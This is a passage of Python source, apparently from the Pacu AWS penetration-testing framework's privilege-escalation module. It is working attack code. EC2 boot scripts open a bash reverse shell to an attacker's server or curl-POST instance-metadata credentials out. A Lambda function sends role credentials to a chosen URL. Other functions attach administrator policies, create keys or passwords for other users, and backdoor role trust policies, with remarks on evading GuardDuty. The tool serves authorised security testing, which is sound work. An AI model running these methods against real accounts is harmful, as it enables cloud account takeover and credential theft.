        "eu-central-1": "ami-7c4f7097",
        "eu-west-1": "ami-466768ac",
        "eu-west-2": "ami-b8b45ddf",
        "eu-west-3": "ami-2cf54551",
        "sa-east-1": "ami-6dca9001",
    }
    ami = amis_by_region[region]

    print("    Targeting region {}...".format(region))

    client = pacu_main.get_boto3_client("iam")

    response = client.list_instance_profiles()
    instance_profiles = response["InstanceProfiles"]
    while response.get("IsTruncated"):
        response = client.list_instance_profiles(Marker=response["Marker"])
        instance_profiles.extend(response["InstanceProfiles"])

    instance_profiles_with_roles = []
    for ip in instance_profiles:
        if len(ip["Roles"]) > 0:
            instance_profiles_with_roles.append(ip)

    if len(instance_profiles_with_roles) > 1:
        print(
            "  Found multiple instance profiles. Choose one below. Only instance profiles with roles attached are shown.\n"
        )
        for i in range(0, len(instance_profiles_with_roles)):
            print(
                "  [{}] {}".format(
                    i, instance_profiles_with_roles[i]["InstanceProfileName"]
                )
            )
        choice = input("What instance profile do you want to use? ")
        instance_profile = instance_profiles_with_roles[int(choice)]
    elif len(instance_profiles_with_roles) == 1:
        instance_profile = instance_profiles[0]
    else:
        print(
            "    No instance profiles with roles attached were found in region {}. Skipping to the next privilege escalation method...\n".format(
                region
            )
        )
        return False

    while True:
        client = pacu_main.get_boto3_client("ec2", region)
        print("Ready to start the new EC2 instance. What would you like to do?")
        print(
            "  1) Open a reverse shell on the instance back to a server you control. Note: Restart the instance to resend the reverse shell connection (will not trigger GuardDuty, requires outbound internet)."
        )
        print(
            "  2) Run an AWS CLI command using the instance profile credentials on startup. Note: Restart the instance to run the command again (will not trigger GuardDuty, requires outbound internet)."
        )
        print(
            "  3) Make an HTTP POST request with the instance profiles credentials on startup. Note: Restart the instance to get a fresh set of credentials sent to you(will trigger GuardDuty finding type UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration when using the keys outside the EC2 instance, requires outbound internet)."
        )
        print(
            "  4) Try to create an SSH key through AWS, allowing you SSH access to the instance (requires inbound access to port 22)."
        )
        print("  5) Skip this privilege escalation method.")
        method = int(input("Choose one [1-5]: "))

        if method == 1:
            # Reverse shell
            external_server = input(
                'The EC2 instance will try to connect to your server using a bash reverse shell. To listen for this, run the command "nc -nlvp <an open port>" from your server where port <an open port> is open to accept the connection. What is the IP and port of your server (example: 127.0.0.1:80)? '
            )
            reverse_shell = "bash -i >& /dev/tcp/{} 0>&1".format(
                external_server.rstrip().replace(":", "/")
            )
            try:
                response = client.run_instances(
                    ImageId=ami,
                    UserData="#cloud-boothook\n#!/bin/bash\n{}".format(reverse_shell),
                    MaxCount=1,
                    MinCount=1,
                    InstanceType="t2.micro",
                    IamInstanceProfile={"Arn": instance_profile["Arn"]},
                )

                print(
                    "Successfully created the EC2 instance, you should receive a reverse connection to your server soon (may take up to 5 minutes in some cases).\n"
                )
                print("  Instance details:")
                print(response)

                return True
            except Exception as error:
                print(
                    "Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n".format(
                        error
                    )
                )
                return False
        elif method == 2:
            # Run AWS CLI command
            aws_cli_command = input(
                'What is the AWS CLI command you would like to execute (example: "aws iam get-user --user-name Bob")? '
            )
            try:
                response = client.run_instances(
                    ImageId=ami,
                    UserData="#cloud-boothook\n#!/bin/bash\n{}".format(aws_cli_command),
                    MaxCount=1,
                    MinCount=1,
                    InstanceType="t2.micro",
                    IamInstanceProfile={"Arn": instance_profile["Arn"]},
                )

                print(
                    "Successfully created the EC2 instance, your AWS CLI command should run soon (may take up to 5 minutes in some cases).\n"
                )
                print("  Instance details:")
                print(response)

                return True
            except Exception as error:
                print(
                    "Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n".format(
                        error
                    )
                )
                return False
        elif method == 3:
            # HTTP POST
            http_server = input(
                "The EC2 instance will make an HTTP POST request to your server containing temporary credentials for the instance profile. Where should this data be POSTed (example: http://my-server.com/creds)? "
            )
            try:
                response = client.run_instances(
                    ImageId=ami,
                    UserData='#cloud-boothook\n#!/bin/bash\nip_name=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\nkeys=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ip_name)\ncurl -X POST -d "$keys" {}'.format(
                        http_server
                    ),
                    MaxCount=1,
                    MinCount=1,
                    InstanceType="t2.micro",
                    IamInstanceProfile={"Arn": instance_profile["Arn"]},
                )

                print(
                    "Successfully created the EC2 instance, you should receive a POST request with the instance credentials soon (may take up to 5 minutes in some cases).\n"
                )
                print("  Instance details:")
                print(response)

                return True
            except Exception as error:
                print(
                    "Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n".format(
                        error
                    )
                )
                return False
        elif method == 4:
            # Create SSH key
            ssh_key_name = "".join(
                random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
            )
            try:
                response = client.create_key_pair(KeyName=ssh_key_name)
            except ClientError as error:
                code = error.response["Error"]["Code"]
                print("FAILURE: ")
                if code == "UnauthorizedOperation":
                    print("  Access denied to CreateKeyPair.")
                else:
                    print("  " + code)
                print("Try a different method.\n")
                continue
            ssh_private_key = response["KeyMaterial"]
            ssh_fingerprint = response["KeyFingerprint"]

            try:
                response = client.run_instances(
                    ImageId=ami,
                    KeyName=ssh_key_name,
                    MaxCount=1,
                    MinCount=1,
                    InstanceType="t2.micro",
                    IamInstanceProfile={"Arn": instance_profile["Arn"]},
                )

                print(
                    "Successfully created the EC2 instance, you can now SSH in using the private key printed below.\n"
                )
                print("  Instance details:")
                print(response)

                with save("downloads/{}".format(ssh_key_name), "w+") as f:
                    f.write(ssh_private_key)
                print(f"  SSH private key (saved to {downloads_dir()}/{ssh_key_name})")
                print(ssh_private_key)

                print("  SSH fingerprint:")
                print(ssh_fingerprint)

                return True
            except Exception as error:
                print(
                    f"Failed to start the EC2 instance, skipping to the next privilege escalation method: {error}\n"
                )
                return False
        else:
            # Skip
            print("Skipping to next privilege escalation method...\n")
            return False


def CreateAccessKey(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method CreateAccessKey...\n")

    username = input(
        "    Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: "
    )
    if (
        fetch_data(["IAM", "Users"], module_info["prerequisite_modules"][1], "--users")
        is False
    ):
        print("Pre-req module not run successfully. Exiting...")
        return False
    users = session.IAM["Users"]
    print("Found {} user(s). Choose a user below.".format(len(users)))
    print("  [0] Other (Manually enter user name)")
    for i in range(0, len(users)):
        print("  [{}] {}".format(i + 1, users[i]["UserName"]))
    choice = input("Choose an option: ")
    if int(choice) == 0:
        username = input("    Enter a user name: ")
    else:
        username = users[int(choice) - 1]["UserName"]

    # Use the iam__backdoor_users_keys module to do the access key creating
    try:
        fetch_data(
            None,
            module_info["prerequisite_modules"][2],
            "--usernames {}".format(username),
            force=True,
        )
    except Exception as e:
        print(
            "      Failed to create an access key for user {}: {}".format(username, e)
        )
        again = input(
            "    Do you want to try another user (y) or continue to the next privilege escalation method (n)? "
        )
        if again.strip().lower() == "y":
            print("      Re-running CreateAccessKey privilege escalation attempt...")
            return CreateAccessKey(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def CreateLoginProfile(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method CreatingLoginProfile...\n")

    username = input(
        "    Is there a specific user you want to target? They must not already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: "
    )
    if (
        fetch_data(["IAM", "Users"], module_info["prerequisite_modules"][1], "--users")
        is False
    ):
        print("Pre-req module not run successfully. Exiting...")
        return False
    users = session.IAM["Users"]
    print("Found {} user(s). Choose a user below.".format(len(users)))
    print("  [0] Other (Manually enter user name)")
    print("  [1] All Users")
    for i in range(0, len(users)):
        print("  [{}] {}".format(i + 2, users[i]["UserName"]))
    choice = input("Choose an option: ")
    if int(choice) == 0:
        username = input("    Enter a user name: ")
    else:
        username = users[int(choice) - 2]["UserName"]

    # Use the iam__backdoor_users_keys module to do the login profile creating
    try:
        if int(choice) == 1:
            user_string = ""
            for user in users:
                user_string = "{},{}".format(
                    user_string, user["UserName"]
                )  # Prepare username list for backdoor_users_password
            user_string = user_string[1:]  # Remove first comma
            fetch_data(
                None,
                module_info["prerequisite_modules"][3],
                "--usernames {}".format(user_string),
                force=True,
            )
        else:
            fetch_data(
                None,
                module_info["prerequisite_modules"][3],
                "--usernames {}".format(username),
                force=True,
            )
    except Exception as e:
        print(
            "      Failed to create a login profile for user {}: {}".format(username, e)
        )
        again = input(
            "    Do you want to try another user (y) or continue to the next privilege escalation method (n)? "
        )
        if again == "y":
            print("      Re-running CreateLoginProfile privilege escalation attempt...")
            return CreateLoginProfile(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def UpdateLoginProfile(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method UpdateLoginProfile...\n")

    username = input(
        "    Is there a specific user you want to target? They must already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: "
    )
    if (
        fetch_data(["IAM", "Users"], module_info["prerequisite_modules"][1], "--users")
        is False
    ):
        print("Pre-req module not run successfully. Exiting...")
        return False
    users = session.IAM["Users"]
    print("Found {} user(s). Choose a user below.".format(len(users)))
    print("  [0] Other (Manually enter user name)")
    print("  [1] All Users")
    for i in range(0, len(users)):
        print("  [{}] {}".format(i + 2, users[i]["UserName"]))
    choice = input("Choose an option: ")
    if int(choice) == 0:
        username = input("    Enter a user name: ")
    else:
        username = users[int(choice) - 2]["UserName"]

    try:
        if int(choice) == 1:
            user_string = ""
            for user in users:
                user_string = "{},{}".format(
                    user_string, user["UserName"]
                )  # Prepare username list for backdoor_users_password
            user_string = user_string[1:]  # Remove first comma
            fetch_data(
                None,
                module_info["prerequisite_modules"][3],
                "--update --usernames {}".format(user_string),
                force=True,
            )
        else:
            fetch_data(
                None,
                module_info["prerequisite_modules"][3],
                "--update --usernames {}".format(username),
                force=True,
            )
        return True
    except Exception as e:
        print(
            "      Failed to update the login profile for user {}: {}".format(
                username, e
            )
        )
        again = input(
            "    Do you want to try another user (y) or continue to the next privilege escalation method (n)? "
        )
        if again == "y":
            print("      Re-running UpdateLoginProfile privilege escalation attempt...")
            return UpdateLoginProfile(pacu_main, print, input, fetch_data)
        else:
            return False


def AttachUserPolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method AttachUserPolicy...\n")

    client = pacu_main.get_boto3_client("iam")

    print("Trying to attach an administrator policy to the current user...\n")

    try:
        active_aws_key = session.get_active_aws_key(pacu_main.database)
        client.attach_user_policy(
            UserName=active_aws_key.user_name,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print(
            "  Successfully attached an administrator policy to the current user! You should now have administrator access.\n"
        )
        return True
    except Exception as error:
        print(
            "  Failed to attach an administrator policy to the current user: {}\n".format(
                error
            )
        )
        return False


def AttachGroupPolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method AttachGroupPolicy...\n")

    active_aws_key = session.get_active_aws_key(pacu_main.database)
    client = pacu_main.get_boto3_client("iam")

    group = input(
        "    Is there a specific group you want to target? Enter its name now or just hit enter to automatically find a valid group: "
    )

    if not group:
        if len(active_aws_key.groups) > 1:
            choice = ""
            while choice == "":
                print(
                    "Found {} groups that the current user belongs to. Choose one below.".format(
                        len(active_aws_key.groups)
                    )
                )
                for i in range(0, len(active_aws_key.groups)):
                    print("  [{}] {}".format(i, active_aws_key.groups[i]["GroupName"]))
                choice = input("Choose an option: ")
            group = active_aws_key.groups[int(choice)]["GroupName"]
        elif len(active_aws_key.groups) == 1:
            print("Found 1 group that the current user belongs to.\n")
            group = active_aws_key.groups[0]["GroupName"]
        else:
            print(
                "  Did not find any groups that the user belongs to. Skipping to the next privilege escalation method...\n"
            )
            return False

    print(
        "Targeting group {}. Trying to attach an administrator policy to it...\n".format(
            group
        )
    )

    try:
        client.attach_group_policy(
            GroupName=group, PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        print(
            "  Successfully attached an administrator policy to the group {}! Members of it should now have administrator access.\n".format(
                group
            )
        )
        return True
    except Exception as error:
        print(
            "  Failed to attach an administrator policy to group {}: {}\n".format(
                group, error
            )
        )
        return False


def AttachRolePolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method PutRolePolicy...\n")

    client = pacu_main.get_boto3_client("iam")

    target_role = input(
        "    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: "
    )

    if not target_role:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role = roles[int(choice)]["RoleName"]

    print(
        "Targeting role {}. Trying to attach an administrator policy to it...".format(
            target_role
        )
    )

    try:
        client.attach_role_policy(
            RoleName=target_role,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )
        print(
            "  Successfully attached an administrator policy to role {}! That role should now have administrator access.\n".format(
                target_role
            )
        )
        return True
    except Exception as error:
        print(
            "  Failed to attach an administrator policy to role {}: {}\n".format(
                target_role, error
            )
        )
        return False


def PutUserPolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()
    active_aws_key = session.get_active_aws_key(pacu_main.database)

    print("  Starting method PutUserPolicy...\n")

    client = pacu_main.get_boto3_client("iam")

    print("Trying to add an administrator policy to the current user...\n")

    policy_name = "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )
    try:
        client.put_user_policy(
            UserName=active_aws_key.user_name,
            PolicyName=policy_name,
            PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}',
        )
        print(
            "  Successfully added an inline policy named {}! You should now have administrator permissions.\n".format(
                policy_name
            )
        )
        return True
    except Exception as error:
        print("  Failed to add inline policy {}: {}\n".format(policy_name, error))
        return False


def PutGroupPolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()
    active_aws_key = session.get_active_aws_key(pacu_main.database)

    print("  Starting method PutGroupPolicy...\n")

    client = pacu_main.get_boto3_client("iam")

    target_group = input(
        "    Is there a specific group to target? Enter the name now or just press enter to enumerate a list of possible groups to choose from: "
    )

    if not target_group:
        print(
            "Found {} groups that the current user belongs to. Choose one below.".format(
                len(active_aws_key.groups)
            )
        )
        for i in range(0, len(active_aws_key.groups)):
            print("  [{}] {}".format(i, active_aws_key.groups[i]["GroupName"]))
        choice = int(input("Choose an option: "))
        target_group = active_aws_key.groups[choice]["GroupName"]

    print(
        "Targeting group {}. Trying to add an administrator policy to it...".format(
            target_group
        )
    )

    policy_name = "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )
    try:
        client.put_group_policy(
            GroupName=target_group,
            PolicyName=policy_name,
            PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}',
        )
        print(
            "  Successfully added an inline policy {} to group {}! You should now have administrator permissions.\n".format(
                policy_name, target_group
            )
        )
        return True
    except Exception as error:
        print(
            "  Failed to add inline policy {} to group {}: {}\n".format(
                policy_name, target_group, error
            )
        )
        return False


def PutRolePolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method PutRolePolicy...\n")

    client = pacu_main.get_boto3_client("iam")

    target_role = input(
        "    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: "
    )

    if not target_role:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role = roles[int(choice)]["RoleName"]

    print(
        "Targeting role {}. Trying to add an administrator policy to it...".format(
            target_role
        )
    )

    policy_name = "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )
    try:
        client.put_role_policy(
            RoleName=target_role,
            PolicyName=policy_name,
            PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}',
        )
        print(
            "  Successfully added an inline policy {} to role {}! That role should now have administrator permissions.\n".format(
                policy_name, target_role
            )
        )
        return True
    except Exception as error:
        print(
            "  Failed to add inline policy {} to role {}: {}\n".format(
                policy_name, target_role
            )
        )
        return False


def AddUserToGroup(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method AddUserToGroup...\n")

    client = pacu_main.get_boto3_client("iam")

    group_name = input(
        "    Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list of possible groups to choose from: "
    )
    if group_name == "":
        if (
            fetch_data(
                ["IAM", "Groups"], module_info["prerequisite_modules"][1], "--groups"
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        groups = session.IAM["Groups"]
        print("Found {} group(s). Choose a group below.".format(len(groups)))
        print("  [0] Other (Manually enter group name)")
        for i in range(0, len(groups)):
            print("  [{}] {}".format(i + 1, groups[i]["GroupName"]))
        choice = input("Choose an option: ")
        if int(choice) == 0:
            group_name = input("    Enter a group name: ")
        else:
            group_name = groups[int(choice) - 1]["GroupName"]

    try:
        active_aws_key = session.get_active_aws_key(pacu_main.database)
        client.add_user_to_group(
            GroupName=group_name, UserName=active_aws_key.user_name
        )
        print(
            "  Successfully added the current user to the group {}! You should now have access to the permissions associated with that group.".format(
                group_name
            )
        )
        return True
    except Exception as e:
        print(
            "  Failed to add the current user to the group {}:\n{}".format(
                group_name, e
            )
        )
        again = input(
            "    Do you want to try again with a different group (y) or continue to the next privilege escalation method (n)? "
        )
        if again == "y":
            print("      Re-running AddUserToGroup privilege escalation attempt...")
            return AddUserToGroup(pacu_main, print, input, fetch_data)
        else:
            return False


def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method UpdateRolePolicyToAssumeIt...\n")

    target_role = input(
        "    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: "
    )

    if not target_role:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role = roles[int(choice)]["RoleName"]

    print(
        "Targeting role {}. Trying to backdoor access to it from the current user...".format(
            target_role
        )
    )

    try:
        if (
            fetch_data(
                ["Backdooring Roles"],
                module_info["prerequisite_modules"][4],
                "--role-names {}".format(target_role),
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        print(
            "Successfully updated the assume-role-policy-document for role {}. You should now be able to assume that role to gain its privileges.\n".format(
                target_role
            )
        )
        return True
    except Exception as error:
        print(
            "Failed to update the assume-role-policy-document for role {}: {}\n".format(
                target_role, error
            )
        )
        again = input(
            "    Do you want to try another role (y) or continue to the next privilege escalation method (n)? "
        )
        if again == "y":
            print(
                "      Re-running UpdateRolePolicyToAssumeIt privilege escalation attempt..."
            )
            return UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data)
        else:
            return False


def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
    print("  Starting method PassExistingRoleToNewLambdaThenInvoke...\n")

    try:
        function_name, region = pass_existing_role_to_lambda(
            pacu_main, print, input, fetch_data
        )
        print(
            'To make use of the new privileges, you need to invoke the newly created function. The function accepts input in the format as follows:\n\n{"cmd": "<aws cli command>"}\n\nWhen invoking the function, pass that JSON object as input, but replace <aws cli command> with an AWS CLI command that you would like to execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has S3 privileges, so you invoke this newly created Lambda function with the input {"cmd": "aws s3 ls"} and it will respond with all the buckets in the account.\n'
        )
        print(
            'Example AWS CLI command to invoke the new Lambda function and execute "aws s3 ls" can be seen here:\n'
        )
        print(
            "aws lambda invoke --function-name {} --region {} --payload file://payload.json --profile CurrentAWSKeys Out.txt\n".format(
                function_name, region
            )
        )
        print(
            'The file "payload.json" would include this object: {"cmd": "aws s3 ls"}. The results of the API call will be stored in ./Out.txt as well.\n'
        )
        return True
    except Exception as error:
        print("Failed to create a new Lambda function: {}\n".format(error))
        return False


def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(
    pacu_main, print, input, fetch_data
):
    print("  Starting method PassExistingRoleToNewLambdaThenTriggerWithNewDynamo...\n")

    # Create Lambda function
    try:
        function_name, region = pass_existing_role_to_lambda(
            pacu_main, print, input, fetch_data
        )
    except Exception as error:
        print("Failed to create a new Lambda function: {}\n".format(error))
        return False

    client = pacu_main.get_boto3_client("dynamodb", region)
    dynamo_table_name = "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )

    # Create DynamoDB table
    try:
        response = client.create_table(
            TableName=dynamo_table_name,
            AttributeDefinitions=[{"AttributeName": "attr", "AttributeType": "S"}],
            KeySchema=[{"AttributeName": "attr", "KeyType": "HASH"}],
            ProvisionedThroughput={"ReadCapacityUnits": 5, "WriteCapacityUnits": 5},
            StreamSpecification={"StreamEnabled": True, "StreamViewType": "KEYS_ONLY"},
        )
        stream_arn = response["TableDescription"]["LatestStreamArn"]
        print("Successfully created new DynamoDB table {}!\n".format(dynamo_table_name))
    except Exception as error:
        print("Failed to create new DynamoDB table: {}\n".format(error))
        return False

    # Create Lambda event source mapping
    try:
        client = pacu_main.get_boto3_client("lambda", region)
        client.create_event_source_mapping(
            FunctionName=function_name,
            EventSourceArn=stream_arn,
            Enabled=True,
            BatchSize=1,
            StartingPosition="LATEST",
        )
        print("Successfully created the Lambda event source mapping!\n")
    except Exception as error:
        print("Failed to create Lambda event source mapping: {}\n".format(error))
        return False

    print(
        'To make use of the new privileges, you need to invoke the newly created function. To do so, you need to PUT an item into the DynamoDB table {}. You can do this from the AWS CLI. The function expects an AWS CLI command that will execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has EC2 privileges, so you PUT an item to the new DynamoDB table in the format: attr={{S="aws ec2 run-instances --image-id ami-123xyz"}} and it will run a new EC2 instance in the current region.\n'.format(
            dynamo_table_name
        )
    )
    print(
        'Example AWS CLI command to invoke the new Lambda function through DynamoDB and execute "aws ec2 run-instances --image-id ami-123xyz" can be seen here:\n'
    )
    print(
        'aws dynamodb put-item --region {} --table-name {} --item attr={{S="aws ec2 run-instances --image-id ami-123xyz"}}\n'.format(
            region, dynamo_table_name
        )
    )
    print(
        "WARNING: This method does not directly return the output of your AWS CLI command, but there are a couple different options you can take:\n  1. Only run commands that you do not need the output of (such as attaching a policy to your user).\n  2. Review the CloudWatch logs relating to your function invocations, if you have permissions to do so.\n"
    )
    return True


def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(
    pacu_main, print, input, fetch_data
):
    print(
        "  Starting method PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo...\n"
    )

    # Enumerate DynamoDB Streams
    regions = pacu_main.get_regions("streams.dynamodb")
    target_region = None
    if len(regions) == 0:
        all_dynamodbstreams_regions = pacu_main.get_regions(
            "streams.dynamodb", check_session=False
        )
        while not target_region:
            target_region = input(
                "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
            )
            if not target_region:
                return False
            elif target_region not in all_dynamodbstreams_regions:
                print(
                    "    Region {} is not a valid DynamoDB Streams region. Please choose a valid region. Valid DynamoDB Streams regions include:\n".format(
                        target_region
                    )
                )
                print(all_dynamodbstreams_regions)
                target_region = None
        regions = [target_region]

    all_streams = {}
    for region in regions:
        client = pacu_main.get_boto3_client("dynamodbstreams", region)
        streams = client.list_streams()["Streams"]
        if len(streams) > 0:
            all_streams[region] = streams

    regions_with_streams = list(all_streams.keys())
    if len(regions_with_streams) > 1:
        print(
            "Found {} regions with DynamoDB streams. These are what will trigger your Lambda function, which ultimately leads to you getting credentials. Choose which region below to create the Lambda function in.".format(
                len(regions_with_streams)
            )
        )
        for i in range(0, len(regions_with_streams)):
            print(
                "  [{}] {} ({} Streams)".format(
                    i,
                    all_streams[regions_with_streams[i]],
                    len(all_streams[regions_with_streams[i]]),
                )
            )
        choice = int(input("Choose an option: "))
        target_region = regions_with_streams[choice]
        region_streams = all_streams[target_region]
    elif len(regions_with_streams) == 1:
        target_region = regions_with_streams[0]
        region_streams = all_streams[target_region]
    else:
        print(
            "Did not find any regions with valid DynamoDB Streams to use. Skipping to next privilege escalation method...\n"
        )
        return False

    # Import template lambda_function for cred exfil
    with open(
        "./modules/{}/lambda_function.py.bak".format(module_info["name"]), "r"
    ) as f:
        code = f.read()

    print(
        "This privilege escalation method requires you to have some way of receiving HTTP requests and reading the contents of the body to retrieve the temporary credentials associated with the Lambda function that will be created.\n"
    )
    print(
        'Start listening on your server now! Simple command to listen on an open port: "nc -nlvp <port>".\n'
    )
    print(
        "WARNING: This privilege escalation method will potentially call your function until it is deleted or the DynamoDB Streams are deleted. This can be useful in the sense that if the credentials you exfiltrated expire, you can get a new set, but it is possible for a large amount of requests to be made.\n"
    )
    their_url = input(
        "Please enter the URL where you would like the credentials POSTed to (example: http://127.0.0.1:8080): "
    )

    # Replace the placeholder in the local code with their server
    code = code.replace("THEIR_URL", their_url)

    with open(
        session_dir() / "modules" / module_info["name"] / "lambda_function.py", "w+"
    ) as f:
        f.write(code)

    # Zip the Lambda function
    try:
        subprocess.run(
            [
                "zip",
                "./modules/{}/lambda_function.zip".format(module_info["name"]),
                "./modules/{}/lambda_function.py".format(module_info["name"]),
            ],
            shell=True,
        )
    except Exception as error:
        print("Failed to zip the Lambda function locally: {}\n".format(error))
        return False

    # Create Lambda function
    try:
        function_name, region = pass_existing_role_to_lambda(
            pacu_main,
            print,
            input,
            fetch_data,
            zip_file="./modules/{}/lambda_function.zip".format(module_info["name"]),
            region=target_region,
        )
    except Exception as error:
        print("Failed to create a new Lambda function: {}\n".format(error))
        return False

    # Set Lambda concurrency limit (Success or fail won't change what happens next, so ignore it)
    client = pacu_main.get_boto3_client("lambda", region)
    try:
        client.put_function_concurrency(
            FunctionName=function_name, ReservedConcurrentExecutions=1
        )
    except:
        pass

    # Create Lambda event source mapping
    print("Creating up to three Lambda event source mappings...\n")
    count = 0
    for stream in region_streams:
        try:
            client.create_event_source_mapping(
                FunctionName=function_name,
                EventSourceArn=stream["StreamArn"],
                Enabled=True,
                BatchSize=1,
                StartingPosition="LATEST",
            )
            print(
                "Successfully created the Lambda event source mapping for stream {}!\n".format(
                    stream["StreamArn"]
                )
            )
            if count > 2:
                break
        except Exception as error:
            print("Failed to create Lambda event source mapping: {}\n".format(error))
            return False

    print(
        'You should now start receiving HTTP requests to your web server that include a set of temporary IAM credentials. Depending on the conditions associated with the DynamoDB Streams, it might take longer than expected. These requests will continue coming until the Lambda function or DynamoDB Streams are deleted or the Lambda event source mapping is deleted from the function. You can enter the exfiltrated credentials into Pacu with the "set_keys" command to try and expand access.\n'
    )
    return True


def pass_existing_role_to_lambda(
    pacu_main, print, input, fetch_data, zip_file="", region=None
):
    session = pacu_main.get_active_session()

    if zip_file == "":
        zip_file = "./modules/{}/lambda.zip".format(module_info["name"])

    if region is None:
        regions = pacu_main.get_regions("lambda")

        if len(regions) > 1:
            print("  Found multiple valid regions to use. Choose one below.\n")
            for i in range(0, len(regions)):
                print("  [{}] {}".format(i, regions[i]))
            choice = input(
                "  What region do you want to create the Lambda function in? "
            )
            region = regions[int(choice)]
        elif len(regions) == 1:
            region = regions[0]
        else:
            while not region:
                all_lambda_regions = pacu_main.get_regions(
                    "lambda", check_session=False
                )
                region = input(
                    "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
                )
                if not region:
                    return False
                elif region not in all_lambda_regions:
                    print(
                        "    Region {} is not a valid Lambda region. Please choose a valid region. Valid Lambda regions include:\n".format(
                            region
                        )
                    )
                    print(all_lambda_regions)
                    region = None

    client = pacu_main.get_boto3_client("lambda", region)

    target_role_arn = input(
        "  Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: "
    )

    if not target_role_arn:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role_arn = roles[int(choice)]["Arn"]

    print(
        "Using role {}. Trying to create a new Lambda function...\n".format(
            target_role_arn
        )
    )

    function_name = "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )

    with open(zip_file, "rb") as f:
        lambda_zip = f.read()

    # Put the error handling in the function calling this function
    client.create_function(
        FunctionName=function_name,
        Runtime="python3.6",
        Role=target_role_arn,
        Code={"ZipFile": lambda_zip},
        Timeout=30,
        Handler="lambda_function.lambda_handler",
    )
    print(
        "Successfully created a Lambda function {} in region {}!\n".format(
            function_name, region
        )
    )
    return (function_name, region)


